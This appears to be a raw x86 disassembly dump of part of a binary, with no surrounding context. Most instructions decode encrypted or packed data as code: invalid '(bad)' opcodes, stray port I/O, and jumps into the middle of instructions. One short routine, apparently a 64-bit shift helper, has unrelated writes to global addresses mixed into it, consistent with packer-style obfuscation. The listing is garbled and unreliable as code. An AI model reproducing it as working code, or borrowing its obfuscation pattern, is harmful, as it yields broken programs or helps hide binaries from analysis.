  4085b9:	leave  
  4085ba:	mov    ch,BYTE PTR [ecx]
  4085bc:	mov    cl,0xfb
  4085be:	ins    DWORD PTR es:[edi],dx
  4085bf:	js     0x4085b2
  4085c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085c2:	ins    BYTE PTR es:[edi],dx
  4085c3:	xchg   edx,eax
  4085c4:	out    0xc3,al
  4085c6:	ins    DWORD PTR es:[edi],dx
  4085c7:	jnp    0x4085b8
  4085c9:	dec    eax
  4085ca:	icebp  
  4085cb:	push   edi
  4085cc:	pusha  
  4085cd:	(bad)  
  4085ce:	adc    eax,0xfc045346
  4085d3:	in     al,0x58
  4085d5:	mov    ch,BYTE PTR [eax]
  4085d7:	std    
  4085d8:	ja     0x40859a
  4085da:	push   eax
  4085db:	div    esp
  4085dd:	pop    ebp
  4085de:	imul   edi,DWORD PTR [edi],0x9afe7cda
  4085e4:	pop    ebp
  4085e5:	sar    DWORD PTR [edx+0x8],0x7
  4085e9:	mov    gs,WORD PTR [edi+eiz*4]
  4085ec:	cmp    BYTE PTR [eax-0x6a757c90],cl
  4085f2:	add    BYTE PTR [edi*4-0x5936bb44],bh
  4085f9:	aad    0x1a
  4085fb:	(bad)  
  4085fc:	cs add eax,0x53c655c1
  408602:	adc    al,0x4c
  408604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408605:	iret   
  408606:	adc    al,0xce
  408608:	add    ebp,DWORD PTR [edx-0x7746d984]
  40860e:	add    eax,0xcd5967b6
  408613:	outs   dx,BYTE PTR ds:[esi]
  408614:	mov    ?,WORD PTR [ecx+0x2]
  408617:	arpl   ax,dx
  408619:	push   0x1f954ffd
  40861e:	sub    dl,al
  408620:	adc    ebp,DWORD PTR [edx-0xa]
  408623:	enter  0x6518,0xde
  408627:	enter  0xc28e,0x50
  40862b:	mov    dl,0x95
  40862d:	lahf   
  40862e:	daa    
  40862f:	lock xchg ecx,eax
  408631:	(bad)  
  408632:	test   al,0x82
  408634:	leavew 
  408636:	gs lock ret 0x4490
  40863b:	xchg   esp,eax
  40863c:	pop    edx
  40863d:	enter  0xe1b8,0x52
  408641:	lea    esp,[ebx+eiz*8+0x4d]
  408645:	add    al,0x43
  408647:	outs   dx,BYTE PTR ds:[esi]
  408648:	mov    al,0x4b
  40864a:	shl    cl,1
  40864c:	sub    ebx,edi
  40864e:	(bad)  
  40864f:	sub    DWORD PTR ds:0x87163465,edx
  408655:	stos   DWORD PTR es:[edi],eax
  408656:	(bad)  
  408657:	sub    DWORD PTR [edx],esp
  408659:	(bad)  
  40865b:	jl     0x40860b
  40865d:	ret    0xda10
  408660:	xchg   DWORD PTR es:[eax],ebp
  408663:	ret    0xaf45
  408666:	jle    0x4086cd
  408668:	in     al,dx
  408669:	mov    cl,0x8a
  40866b:	push   ebx
  40866c:	adc    BYTE PTR [eax-0x7e],dl
  40866f:	dec    edi
  408670:	aam    0x2b
  408672:	xchg   edi,eax
  408673:	pop    edx
  408674:	push   cs
  408675:	or     esi,DWORD PTR [edi+0x115a1d4e]
  40867b:	mov    ds:0x5537c60a,eax
  408680:	adc    al,0xab
  408682:	das    
  408683:	add    BYTE PTR [esp+edx*1],cl
  408686:	inc    ebp
  408687:	rol    BYTE PTR [ebx],1
  408689:	xlat   BYTE PTR ds:[ebx]
  40868a:	inc    edi
  40868b:	iret   
  40868c:	xchg   ebx,eax
  40868d:	sub    ah,BYTE PTR [edi]
  40868f:	jge    0x4086d6
  408691:	vpshad xmm3,xmm2,[esi]
  408696:	sub    esi,DWORD PTR [ebp-0x61]
  408699:	xlat   BYTE PTR ds:[ebx]
  40869a:	ja     0x408663
  40869c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40869d:	push   cs
  40869e:	inc    ebp
  40869f:	(bad)  
  4086a0:	sub    dl,BYTE PTR [bx]
  4086a3:	sub    DWORD PTR [ebx-0x50446271],ebx
  4086a9:	popa   
  4086aa:	inc    edx
  4086ab:	sbb    DWORD PTR [ebx-0x49],ebp
  4086ae:	jbe    0x408655
  4086b0:	sar    ah,0x89
  4086b3:	repnz mov ss,WORD PTR [edx]
  4086b6:	std    
  4086b7:	cmp    BYTE PTR [edx+edx*2],0xc1
  4086bb:	lahf   
  4086bc:	mov    esp,0xfce5b7c8
  4086c1:	dec    ebx
  4086c2:	stc    
  4086c3:	jg     0x40871e
  4086c5:	dec    esp
  4086c6:	test   ebp,edx
  4086c8:	jge    0x408712
  4086ca:	bnd jle 0x408692
  4086cd:	jbe    0x408685
  4086cf:	pop    ebp
  4086d0:	inc    eax
  4086d1:	retf   0x7dd6
  4086d4:	add    al,0x86
  4086d6:	out    0xc7,al
  4086d8:	lods   eax,DWORD PTR ds:[esi]
  4086d9:	push   esp
  4086da:	dec    esp
  4086db:	xchg   ebx,eax
  4086dc:	pop    eax
  4086dd:	je     0x408727
  4086df:	ss in  eax,0x65
  4086e2:	sbb    ebx,esi
  4086e4:	ins    BYTE PTR es:[edi],dx
  4086e5:	mov    WORD PTR [edx-0x7a],cs
  4086e8:	stc    
  4086e9:	daa    
  4086ea:	mov    edi,0xe9d030e
  4086ef:	pusha  
  4086f0:	pop    ds
  4086f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086f2:	sar    DWORD PTR ds:0xfaaf99c8,cl
  4086f8:	test   al,0x23
  4086fa:	and    bl,BYTE PTR [eax]
  4086fc:	jp     0x408769
  4086fe:	sub    eax,0x7e43e8da
  408703:	push   ss
  408704:	pop    esp
  408705:	jno    0x4086a2
  408707:	or     BYTE PTR [esp+edi*2],dl
  40870a:	js     0x4086c3
  40870c:	push   ss
  40870d:	cwde   
  40870e:	gs scas eax,DWORD PTR es:[edi]
  408710:	jb     0x4086aa
  408712:	out    0xe2,eax
  408714:	add    esi,DWORD PTR [ebp+0x396f6fa1]
  40871a:	jns    0x408794
  40871c:	and    BYTE PTR [esi+ebp*1+0x2c],bh
  408720:	jne    0x408704
  408722:	pusha  
  408723:	mov    edi,ebp
  408725:	pusha  
  408726:	dec    edi
  408727:	sbb    ch,BYTE PTR ds:0x5e9db7b3
  40872d:	push   ds
  40872e:	ror    DWORD PTR [ecx-0x30],cl
  408731:	inc    edx
  408732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408733:	outs   dx,BYTE PTR ds:[esi]
  408734:	cli    
  408735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408736:	and    al,0x7c
  408738:	mov    ah,0x9a
  40873a:	fs inc ebp
  40873c:	jl     0x4086cb
  40873e:	push   0xfc2a6ed5
  408743:	xlat   BYTE PTR ds:[ebx]
  408744:	punpckhbw mm5,QWORD PTR [edx]
  408747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408748:	int3   
  408749:	loopne 0x408740
  40874b:	mov    eax,0xde279942
  408750:	sub    ah,BYTE PTR [esi-0x39d4972f]
  408756:	dec    eax
  408757:	mov    ebx,0xf8fa5ae6
  40875c:	pushf  
  40875d:	outs   dx,BYTE PTR ds:[si]
  40875f:	bound  edi,QWORD PTR [edi+0x22ed37c9]
  408765:	mov    esp,0x5a99aad5
  40876a:	out    dx,eax
  40876b:	jle    0x4086f7
  40876d:	in     eax,0xa9
  40876f:	mov    ds:0xc9946432,al
  408774:	sub    edi,DWORD PTR ds:0x7aad06c9
  40877a:	mov    edi,0x54be2de6
  40877f:	jle    0x4087eb
  408781:	jb     0x4087ac
  408783:	stc    
  408784:	stc    
  408785:	mov    dh,0x16
  408787:	push   ss
  408788:	adc    eax,DWORD PTR [ebp-0x3ba12f70]
  40878e:	arpl   WORD PTR [edx-0x6a],di
  408791:	adc    BYTE PTR [esi],bl
  408793:	stos   DWORD PTR es:[edi],eax
  408794:	stc    
  408795:	shr    BYTE PTR [esi],1
  408797:	fdiv   DWORD PTR [edx]
  408799:	stos   BYTE PTR es:[edi],al
  40879a:	push   es
  40879b:	add    ch,BYTE PTR [edi]
  40879d:	cmc    
  40879e:	mov    BYTE PTR [edi],0xad
  4087a1:	xchg   ebp,eax
  4087a2:	lahf   
  4087a3:	and    esi,ebx
  4087a5:	dec    ecx
  4087a6:	sub    ah,BYTE PTR [ebp-0x62cdedb7]
  4087ac:	shl    DWORD PTR [eax+0x7c],0xa8
  4087b0:	test   BYTE PTR [ecx],dl
  4087b2:	adc    DWORD PTR [ebx+esi*8+0x33],esi
  4087b6:	nop
  4087b7:	cmp    al,0xe7
  4087b9:	arpl   dx,bp
  4087bb:	pusha  
  4087bc:	mov    ch,0x7a
  4087be:	inc    esp
  4087bf:	xor    esi,DWORD PTR [edx-0x22]
  4087c2:	fisubr WORD PTR [edx]
  4087c4:	add    bh,bl
  4087c6:	mov    bl,0x67
  4087c8:	out    0xcc,eax
  4087ca:	mov    ebx,0xd0f014b2
  4087cf:	mov    ecx,0x4877601b
  4087d4:	xlat   BYTE PTR ds:[ebx]
  4087d5:	(bad)  
  4087d6:	sub    al,0x71
  4087d8:	dec    esi
  4087d9:	pop    edx
  4087da:	jne    0x4087ef
  4087dc:	xor    edi,0x9c2b8ae8
  4087e2:	mov    ecx,edi
  4087e4:	shrd   eax,ecx,0x2
  4087e8:	or     eax,DWORD PTR [ebp+0x10]
  4087eb:	shr    ecx,0x2
  4087ee:	or     ecx,DWORD PTR [ebp+0x14]
  4087f1:	jmp    0x408b92
  4087f6:	sbb    cl,cl
  4087f8:	ins    DWORD PTR es:[edi],dx
  4087f9:	xchg   esi,eax
  4087fa:	mov    bl,0xba
  4087fc:	cmp    BYTE PTR [edx+ebp*4-0x21],cl
  408800:	xchg   esp,eax
  408801:	nop
  408802:	leave  
  408803:	ss or  bh,0xbe
  408807:	jae    0x4087c7
  408809:	mov    esi,0xbebec4bd
  40880e:	es xchg edi,eax
  408810:	mov    ebp,0xd8bf4fc1
  408815:	data16 (bad) 
  408817:	pop    ss
  408818:	(bad)  
  408819:	in     eax,0xa0
  40881b:	daa    
  40881c:	xchg   ecx,eax
  40881d:	push   0x7d
  40881f:	pushf  
  408820:	rcr    DWORD PTR [esp+eiz*8+0x29],0x4e
  408825:	fimul  DWORD PTR [ecx-0x4dc60a6b]
  40882b:	xlat   BYTE PTR ds:[ebx]
  40882c:	jns    0x4087b2
  40882e:	(bad)  
  40882f:	jne    0x408861
  408831:	push   ebx
  408832:	leave  
  408833:	iret   
  408834:	test   al,0x4c
  408836:	gs xchg esp,eax
  408838:	rol    BYTE PTR [esi+0x48],0xaf
  40883c:	jae    0x40887a
  40883e:	xor    bl,BYTE PTR [edi]
  408840:	test   DWORD PTR [edx+0x9],ebp
  408843:	(bad)  
  408844:	xor    ebp,esp
  408846:	fdivr  QWORD PTR [ebp-0x5778ce80]
  40884c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40884d:	mov    ah,0xb3
  40884f:	(bad)  
  408850:	ins    DWORD PTR es:[edi],dx
  408851:	adc    edi,DWORD PTR [ebx+0x74f340c8]
  408857:	cmp    BYTE PTR ds:0x86359a33,dh
  40885d:	adc    al,BYTE PTR [ecx-0x52]
  408860:	jl     0x40884a
  408862:	inc    ebp
  408863:	aad    0xa8
  408865:	call   0x576b5820
  40886a:	mov    BYTE PTR [edi-0x736935ee],dl
  408870:	mov    dl,0x6f
  408872:	jl     0x4088be
  408874:	sbb    bh,BYTE PTR [ebx]
  408876:	ss xchg edx,eax
  408878:	push   cs
  408879:	call   0x78c0aaf1
  40887e:	shr    esp,cl
  408880:	mov    dl,0xc8
  408882:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  408884:	adc    DWORD PTR [ebx-0x59c2d48f],0xfffffff1
  40888b:	in     al,0x2b
  40888d:	inc    ebx
  40888e:	xchg   ebp,eax
  40888f:	sbb    al,0x81
  408891:	push   es
  408892:	mov    ecx,0xaad91e3c
  408897:	push   ebp
  408898:	inc    esi
  408899:	aas    
  40889a:	add    ah,al
  40889c:	int    0x9a
  40889e:	pop    eax
  40889f:	leave  
  4088a0:	add    BYTE PTR [edi],ch
  4088a2:	pop    ds
  4088a3:	scas   eax,DWORD PTR es:[edi]
  4088a4:	cwde   
  4088a5:	rcl    BYTE PTR [esi-0x66f61a9b],0x69
  4088ac:	sbb    edi,DWORD PTR [ecx-0x589cce4e]
  4088b2:	jns    0x40892c
  4088b4:	pop    edx
  4088b5:	xor    al,0xde
  4088b7:	add    al,0xeb
  4088b9:	dec    edx
  4088ba:	pop    esp
  4088bb:	mov    eax,0x8b2a5afd
  4088c0:	adc    BYTE PTR [ebp+0x7a],dl
  4088c3:	jle    0x4088ff
  4088c5:	iret   
  4088c6:	loope  0x408858
  4088c8:	mov    edx,0x7d806a48
  4088cd:	cdq    
  4088ce:	test   eax,0xeee82ca4
  4088d3:	imul   BYTE PTR [ecx-0x9]
  4088d6:	dec    ecx
  4088d7:	add    dh,BYTE PTR [eax]
  4088d9:	(bad)  
  4088da:	xor    DWORD PTR gs:[edx+0x71a07ab4],0xfb2e7187
  4088e5:	push   ds
  4088e6:	mov    eax,0xad324a40
  4088eb:	out    0x29,eax
  4088ed:	clc    
  4088ee:	mov    bh,0xf6
  4088f0:	mov    al,ds:0x8bc1552c
  4088f5:	and    al,0x9e
  4088f7:	jmp    0x408903
  4088f9:	nop
  4088fa:	jnp    0x40896c
  4088fc:	xor    eax,0x4a818b6e
  408901:	in     eax,0xdc
  408903:	cmp    al,0xe8
  408906:	scas   eax,DWORD PTR es:[edi]
  408907:	das    
  408908:	out    0x27,eax
  40890a:	test   eax,eax
  40890c:	es aam 0xfa
  40890f:	cwde   
  408910:	stos   BYTE PTR es:[edi],al
  408911:	jge    0x40890f
  408913:	test   BYTE PTR [ebx+eax*4],dh
  408916:	js     0x40892a
  408918:	and    bl,bl
  40891a:	fdivr  DWORD PTR [edx+ebx*4-0x38]
  40891e:	loopne 0x4088d7
  408920:	dec    edi
  408921:	shl    BYTE PTR [ebx-0x5d],1
  408924:	pushf  
  408925:	adc    BYTE PTR ss:[eax],dl
  408928:	mov    edx,esp
  40892a:	das    
  40892b:	sti    
  40892c:	addr16 ss inc esp
  40892f:	push   eax
  408930:	sbb    ebp,DWORD PTR ds:0x71e6d0dd
  408936:	cmc    
  408937:	in     eax,0xfd
  408939:	dec    edx
  40893a:	dec    edx
  40893b:	pushf  
  40893c:	fisub  WORD PTR cs:[ebx]
  40893f:	sub    ecx,DWORD PTR [edi-0x42]
  408942:	sbb    BYTE PTR [edi+ecx*4+0xd],0x28
  408947:	adc    edi,eax
  408949:	leave  
  40894a:	adc    dl,BYTE PTR [ecx+ebx*4-0x50]
  40894e:	mov    ch,0x3f
  408950:	dec    edx
  408951:	mov    WORD PTR [ecx+0x2de5948],?
  408957:	sbb    DWORD PTR [esp+ebp*4-0x79],edi
  40895b:	test   eax,0x56115a96
  408960:	jns    0x4089b3
  408962:	inc    ebp
  408963:	retf   
  408964:	dec    edi
  408965:	push   edx
  408966:	repnz xor edi,DWORD PTR [ebx+eax*4-0xa8051dd]
  40896e:	sub    dl,bl
  408970:	pop    edx
  408971:	push   edi
  408972:	call   0x26ef:0xfa628a2a
  408979:	not    esi
  40897b:	dec    esi
  40897c:	shl    esp,cl
  40897e:	jle    0x408926
  408980:	mov    al,0x8e
  408982:	xchg   edi,eax
  408983:	mov    ch,0xfb
  408985:	xor    DWORD PTR [ebx+0x28ce405c],0xd4d37509
  40898f:	lods   eax,DWORD PTR ds:[esi]
  408990:	mov    ecx,0x3834947e
  408995:	inc    esp
  408996:	imul   edi,DWORD PTR [edx+eiz*8-0x721ccdc],0x8cdf995
  4089a1:	mov    ds:0x36c25b97,al
  4089a6:	sub    ebx,edi
  4089a8:	and    eax,0x3a079413
  4089ad:	fidivr WORD PTR [ecx]
  4089af:	icebp  
  4089b0:	fdiv   DWORD PTR [ebp+0x49]
  4089b3:	jp     0x408937
  4089b5:	jmp    0xbac6f7
  4089ba:	push   ecx
  4089bb:	gs mov ebp,0x739d4f7a
  4089c1:	xor    BYTE PTR [edi+edi*2+0x493050ba],dl
  4089c8:	frstor [edi+ebp*1]
  4089cb:	adc    al,0xc0
  4089cd:	xchg   sp,ax
  4089cf:	clc    
  4089d0:	shl    BYTE PTR [edx],cl
  4089d2:	mov    DWORD PTR [edx-0x77],eax
  4089d5:	fcom   QWORD PTR [edx+0x2e85fc0a]
  4089db:	fwait
  4089dc:	mov    edi,0xb5d3e0f3
  4089e1:	in     eax,0x4d
  4089e3:	lea    ecx,[edi+0x46b649e0]
  4089e9:	mov    eax,DWORD PTR [esi-0x6ef14257]
  4089ef:	icebp  
  4089f0:	adc    eax,0xe708bd84
  4089f5:	outs   dx,DWORD PTR ds:[esi]
  4089f6:	pop    esi
  4089f7:	cld    
  4089f8:	dec    ebp
  4089f9:	sub    cl,BYTE PTR [ebx+ecx*1]
  4089fc:	jmp    0xf4f6b3c2
  408a01:	pop    ebp
  408a02:	mov    ?,esi
  408a04:	js     0x408a79
  408a06:	ins    BYTE PTR es:[edi],dx
  408a07:	lock cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  408a0a:	mov    ch,0xea
  408a0c:	ins    BYTE PTR es:[edi],dx
  408a0d:	cmp    al,0xda
  408a0f:	test   eax,0x67caeed3
  408a14:	sub    DWORD PTR [eax+eiz*8+0x56175be],ebp
  408a1b:	inc    edi
  408a1c:	add    dh,BYTE PTR [edx+0x7986b33]
  408a22:	sub    ecx,DWORD PTR [edi-0x7f468bfc]
  408a28:	and    dl,BYTE PTR [eax]
  408a2a:	sub    edi,DWORD PTR [ecx+ebx*8+0x38a16869]
  408a31:	ror    dl,0x6d
  408a34:	fmul   st,st(3)
  408a36:	out    dx,eax
  408a37:	pop    ds
  408a38:	into   
  408a39:	inc    edx
  408a3a:	test   DWORD PTR [edi-0x6e5f0e21],eax
  408a40:	lods   al,BYTE PTR ds:[esi]
  408a41:	fiadd  DWORD PTR [eax-0x49d16001]
  408a47:	daa    
  408a48:	outs   dx,DWORD PTR ds:[esi]
  408a49:	pushf  
  408a4a:	jne    0x408aa1
  408a4c:	sar    BYTE PTR [ecx-0x3dca6c00],cl
  408a52:	out    0xe1,eax
  408a54:	shl    DWORD PTR [edi-0x48],1
  408a57:	loope  0x408a21
  408a59:	das    
  408a5a:	push   ss
  408a5b:	inc    ebx
  408a5c:	pop    ebp
  408a5d:	push   edx
  408a5e:	or     eax,0x3c673020
  408a63:	xchg   esp,eax
  408a64:	aaa    
  408a65:	pop    ds
  408a66:	in     eax,0xcf
  408a68:	fadd   QWORD PTR [esi]
  408a6a:	pop    ss
  408a6b:	icebp  
  408a6c:	mov    edx,0xe5591553
  408a71:	bound  esi,QWORD PTR [ecx]
  408a73:	cs sbb al,0xcc
  408a76:	pop    edi
  408a77:	scas   eax,DWORD PTR es:[edi]
  408a78:	jne    0x408aa5
  408a7a:	sahf   
  408a7b:	ja     0x408af7
  408a7d:	ds push esp
  408a7f:	test   edi,ebp
  408a81:	jmp    0xbdcaccc
  408a86:	in     al,0x4e
  408a88:	xor    eax,DWORD PTR [ebx]
  408a8a:	mov    ecx,0x4b4055da
  408a8f:	pop    ecx
  408a90:	in     eax,dx
  408a91:	retf   0x3102
  408a94:	in     al,0x5f
  408a96:	xchg   BYTE PTR [edx-0x68],dh
  408a99:	cmp    al,BYTE PTR [edi+0x3979bab9]
  408a9f:	sub    ah,bh
  408aa1:	sbb    BYTE PTR [ecx-0x1d],dl
  408aa4:	push   cs
  408aa5:	jo     0x408aa1
  408aa7:	add    eax,0x9baf3b6
  408aac:	loopne 0x408ae6
  408aae:	inc    ecx
  408aaf:	test   DWORD PTR [esi+0x3d854d59],edi
  408ab5:	out    dx,eax
  408ab6:	(bad)  
  408ab7:	sbb    ebp,edi
  408ab9:	popf   
  408aba:	hlt    
  408abb:	pop    ebp
  408abc:	xchg   BYTE PTR [edi+0xb],ch
  408abf:	sub    BYTE PTR [ecx-0x3e35bb5],ah
  408ac5:	push   eax
  408ac6:	out    0x6f,eax
  408ac8:	inc    edi
  408ac9:	in     eax,dx
  408aca:	scas   eax,DWORD PTR es:[edi]
  408acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408acc:	sub    esi,DWORD PTR [edx]
  408ace:	sub    BYTE PTR [ebx-0x25],0xa9
  408ad2:	mov    al,ds:0xb855efa6
  408ad7:	sub    BYTE PTR [esi+0x47540135],bh
  408add:	push   ds
  408ade:	and    eax,0x2ced4367
  408ae3:	(bad)  
  408ae4:	scas   eax,DWORD PTR es:[edi]
  408ae5:	and    eax,0xddca701
  408aea:	sti    
  408aeb:	test   eax,0x549bad69
  408af0:	retf   0x68eb
  408af3:	pop    edi
  408af4:	or     eax,0x157e38d3
  408af9:	adc    dh,bh
  408afb:	dec    esi
  408afc:	inc    edi
  408afd:	sub    al,0x38
  408aff:	in     al,dx
  408b00:	or     DWORD PTR [edx],eax
  408b02:	in     al,0xcb
  408b04:	fdiv   st(4),st
  408b06:	addr16 fcomi st,st(0)
  408b09:	aad    0x54
  408b0b:	je     0x408a8d
  408b0d:	or     BYTE PTR [esi],cl
  408b0f:	adc    al,0x4b
  408b11:	add    eax,0x18a0c989
  408b16:	jg     0x408aa6
  408b18:	xchg   DWORD PTR [edi+0x3fff8d96],ecx
  408b1e:	adc    BYTE PTR [esi+0x25],cl
  408b21:	add    BYTE PTR [eax-0x13],0x55
  408b25:	test   al,0xb8
  408b27:	cmp    eax,DWORD PTR ds:0xd41562af
  408b2d:	cmp    eax,0xaa17130d
  408b32:	jns    0x408b24
  408b34:	and    eax,0x703c31b0
  408b39:	push   cs
  408b3a:	je     0x408b17
  408b3c:	les    eax,FWORD PTR [esi-0x2d152a18]
  408b42:	cwde   
  408b43:	xchg   edi,eax
  408b44:	sub    edi,ebx
  408b46:	xchg   esp,esi
  408b48:	sahf   
  408b49:	in     eax,0x58
  408b4b:	bound  edx,QWORD PTR ds:0xb04003f7
  408b51:	jl     0x408b02
  408b53:	(bad)  
  408b54:	push   0x47
  408b56:	cli    
  408b57:	shl    BYTE PTR es:[ecx],cl
  408b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b5b:	mov    bl,0x1d
  408b5d:	xor    BYTE PTR [esi-0x575c01d9],ch
  408b63:	js     0x408b86
  408b65:	sub    al,0xf8
  408b67:	lock pop si
  408b6a:	mov    ds:0x82170229,eax
  408b6f:	push   es
  408b70:	pushf  
  408b71:	dec    esi
  408b72:	out    dx,eax
  408b73:	mov    al,ds:0xe606ca6a
  408b78:	xchg   DWORD PTR [esi],edi
  408b7a:	call   0x514f:0x8c70a3
  408b81:	enter  0xc154,0x73
  408b85:	(bad)  
  408b86:	dec    edx
  408b87:	jnp    0x408b6f
  408b89:	or     eax,0xb141d5e2
  408b8e:	inc    eax
  408b8f:	sub    edx,DWORD PTR [ecx+0xfd03b9e]
  408b95:	test   DWORD PTR [ecx],ecx
  408b97:	add    BYTE PTR [eax],al
  408b99:	add    BYTE PTR [ecx],bh
  408b9b:	dec    ebp
  408b9c:	or     al,0xf
  408b9e:	test   BYTE PTR [eax],dl
  408ba0:	add    BYTE PTR [eax],al
  408ba2:	add    bh,bh
  408ba4:	jne    0x408bc6
  408ba6:	push   DWORD PTR [ebp+0x1c]
  408ba9:	push   DWORD PTR [ebp+0x18]
  408bac:	push   ebx
  408bad:	push   esi
  408bae:	call   0x411472
  408bb3:	pop    edi
  408bb4:	leave  
  408bb5:	ret    0x1c
  408bb8:	cmp    cl,0x40
  408bbb:	jae    0x408bf8
  408bc1:	cmp    cl,0x20
  408bc4:	mov    DWORD PTR ds:0x42832d,0x1ce5
  408bce:	jae    0x408be4
  408bd4:	xor    DWORD PTR ds:0x4284f1,0x6917
  408bde:	shrd   eax,edx,cl
  408be1:	shr    edx,cl
  408be3:	ret    
  408be4:	mov    eax,edx
  408be6:	xor    edx,edx
  408be8:	and    cl,0x1f
  408beb:	mov    DWORD PTR ds:0x428549,0x321d
  408bf5:	shr    eax,cl
  408bf7:	ret    
  408bf8:	xor    eax,eax
  408bfa:	xor    edx,edx
  408bfc:	ret    
  408bfd:	push   ebp
  408bfe:	mov    ebp,esp
  408c00:	jmp    0x408e7f
  408c05:	addr16 hlt 
  408c07:	js     0x408c4d
  408c09:	jl     0x408c57
  408c0b:	jnp    0x408c09
  408c0d:	dec    edx
  408c0e:	xlat   BYTE PTR ds:[ebx]
  408c0f:	pop    esi
  408c10:	sahf   
  408c11:	repnz add DWORD PTR [eax-0x62],esp
  408c15:	mov    ebp,0x79bebe79
  408c1a:	ret    0xbebe
  408c1d:	dec    eax
  408c1e:	call   0xcc961564
  408c23:	dec    ebx
  408c24:	punpckhdq mm0,QWORD PTR [edi-0x6c8fec6]
  408c2b:	test   DWORD PTR [ecx+0x8],0x968a0ea5
  408c32:	test   eax,0x887ec1c9
  408c37:	or     esi,DWORD PTR [esi-0x4e1f9646]
  408c3d:	pop    DWORD PTR [esi+0x25]
  408c40:	pop    ebp
  408c41:	xor    esi,DWORD PTR [ebp+0x61927e8b]
  408c47:	ffree  st(2)
  408c49:	sbb    DWORD PTR [eax+edi*2],esi
  408c4c:	mov    eax,0x165d2cee
  408c51:	pop    ecx
  408c52:	xchg   edi,eax
  408c53:	jbe    0x408c2a
  408c55:	fbstp  TBYTE PTR [ebp+edx*1-0x30]
  408c59:	ficomp DWORD PTR [ebx+0x46adc2ab]
  408c5f:	adc    al,cl
  408c61:	outs   dx,DWORD PTR ds:[esi]
  408c62:	stos   BYTE PTR es:[edi],al
  408c63:	cmp    ebp,DWORD PTR [esi+ebx*2]
  408c66:	jmp    0x408c42
  408c68:	inc    ebp
  408c69:	clc    
  408c6a:	xor    eax,0xd612536a
  408c6f:	sti    
  408c70:	ins    BYTE PTR es:[edi],dx
  408c71:	push   cs
  408c72:	push   cs
  408c73:	mov    eax,ds:0x7d732c90
  408c78:	or     al,0x6d
  408c7a:	inc    edx
  408c7b:	ja     0x408cb7
  408c7d:	rcr    eax,1
  408c7f:	fcomp  st(2)
  408c81:	xchg   esi,eax
  408c82:	icebp  
  408c83:	mov    ds:0xc42ddae8,eax
  408c88:	xor    BYTE PTR [ecx+edi*8],0x2
  408c8c:	pop    ebx
  408c8e:	adc    edi,edi
  408c90:	mov    al,0x82
  408c92:	in     al,0xb8
  408c94:	imul   edi,DWORD PTR [edx+eiz*2-0x45],0xffffff86
  408c99:	sub    eax,0xe00adfb7
  408c9e:	rcl    DWORD PTR [ebx-0x7d],cl
  408ca1:	ficom  DWORD PTR [edx-0xdef5e5]
  408ca7:	push   ss
  408ca8:	add    DWORD PTR [ebx+0x5a3636cf],esi
  408cae:	je     0x408ca2
  408cb0:	or     BYTE PTR [eax],al
  408cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb3:	dec    ebx
  408cb4:	mov    BYTE PTR [ecx-0x45],ah
  408cb7:	jns    0x408c70
  408cb9:	popa   
  408cba:	and    eax,0x427f3b1b
  408cbf:	and    BYTE PTR [ebx-0x53eae653],dl
  408cc5:	(bad)  
  408cc7:	or     eax,0x87f8782e
  408ccc:	in     eax,dx
  408ccd:	out    0x9d,eax
  408ccf:	mov    eax,0x5fd97d0
  408cd4:	or     bh,BYTE PTR [edi]
  408cd6:	push   ecx
  408cd7:	mov    WORD PTR [eax],?
  408cd9:	lods   al,BYTE PTR ds:[esi]
  408cda:	mov    al,0x30
  408cdc:	sahf   
  408cdd:	std    
  408cde:	stos   DWORD PTR es:[edi],eax
  408cdf:	sbb    eax,0xcdea41ac
  408ce4:	outs   dx,DWORD PTR ds:[esi]
  408ce5:	stos   DWORD PTR es:[edi],eax
  408ce6:	ret    0x36c1
  408ce9:	xor    DWORD PTR [ebx+0x67fc25c1],esi
  408cef:	fild   QWORD PTR [edx+0x27ee2838]
  408cf5:	fistp  DWORD PTR [ecx-0x6]
  408cf8:	fstp   DWORD PTR [ecx-0x1e]
  408cfb:	dec    ecx
  408cfc:	out    0x60,al
  408cfe:	and    al,0x8a
  408d00:	lea    ebp,[ebx+ebx*8+0x60]
  408d04:	out    0x77,al
  408d06:	js     0x408cc7
  408d08:	mov    esi,edx
  408d0a:	jecxz  0x408d5b
  408d0c:	icebp  
  408d0d:	dec    eax
  408d0e:	and    eax,edi
  408d10:	push   edx
  408d11:	das    
  408d12:	push   0xfffffff5
  408d14:	into   
  408d15:	mov    DWORD PTR [edx],esi
  408d17:	and    DWORD PTR [ebx-0x70],eax
  408d1a:	push   ds
  408d1b:	fld    QWORD PTR [eax]
  408d1d:	mov    BYTE PTR [esi+0x6c],dh
  408d20:	pop    esi
  408d21:	mov    esi,0x438c73b2
  408d26:	inc    esi
  408d27:	ins    DWORD PTR es:[edi],dx
  408d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d29:	xchg   esi,eax
  408d2a:	mov    dl,0xc7
  408d2c:	push   esi
  408d2d:	pushf  
  408d2e:	jno    0x408da1
  408d30:	fmul   DWORD PTR [ecx-0x10a2830d]
  408d36:	inc    ebx
  408d37:	add    ecx,DWORD PTR [ebx]
  408d39:	hlt    
  408d3a:	cs mov esp,0xe7a72265
  408d40:	sub    eax,ebx
  408d42:	push   ss
  408d43:	or     al,0x63
  408d45:	div    ch
  408d47:	ins    DWORD PTR es:[edi],dx
  408d48:	sub    al,0x5c
  408d4a:	mov    eax,DWORD PTR [eax]
  408d4c:	sbb    BYTE PTR [edi],dl
  408d4e:	mov    eax,ds:0xa63d3fc5
  408d53:	jecxz  0x408d6c
  408d55:	push   eax
  408d56:	fimul  DWORD PTR [eax-0x162dec07]
  408d5c:	mov    al,0xbe
  408d5e:	add    DWORD PTR [ecx],ebx
  408d60:	retf   
  408d61:	inc    esi
  408d62:	int3   
  408d63:	mov    edi,0xaaa76473
  408d68:	push   es
